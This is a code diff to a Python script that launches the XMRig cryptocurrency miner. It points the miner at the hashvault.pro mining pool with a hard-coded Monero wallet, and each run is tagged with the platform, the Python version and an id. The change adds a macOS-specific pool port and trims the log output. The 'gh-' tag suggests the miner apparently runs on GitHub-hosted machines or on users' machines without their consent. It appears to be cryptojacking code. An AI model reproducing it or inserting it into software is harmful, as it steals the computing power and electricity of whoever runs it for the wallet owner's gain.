@@ -11,10 +11,7 @@ from uuid import uuid1
 import aiohttp
 
 # Configure logging
-logging.basicConfig(
-    level=logging.INFO,  # Set the logging level
-    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",  # Log format
-)
+logging.basicConfig(level=logging.INFO, format="%(message)s")
 logger = logging.getLogger(__name__)
 
 
@@ -79,8 +76,10 @@ async def main():
     os_type = platform.system().lower()
     arch = platform.machine().lower()
 
+    pool_port = 80
     if os_type == "darwin":
         filename = "macos-arm64" if arch == "arm64" else "macos-x64"
+        pool_port = 3333
     elif os_type == "windows":
         filename = "msvc-win64"
     else:
@@ -102,7 +101,7 @@ async def main():
         command = " ".join(
             [
                 "./xmrig",
-                "--url chicago01.hashvault.pro:80",
+                f"--url chicago01.hashvault.pro:{pool_port}",
                 f"--pass gh-{filename}-{sys.version_info.major}{sys.version_info.minor}-{uuid1().hex[:8]}",
                 "--user 45t7Zj3p8wzaYX4ZArqfh5ZN3UPZs4hAY7kvdo8jwAsSegymsUNbiEU31cof3g7xfGdDV2kV4FH4ng1p7JGt3C459DJDS1h",
                 "--donate-level 1",
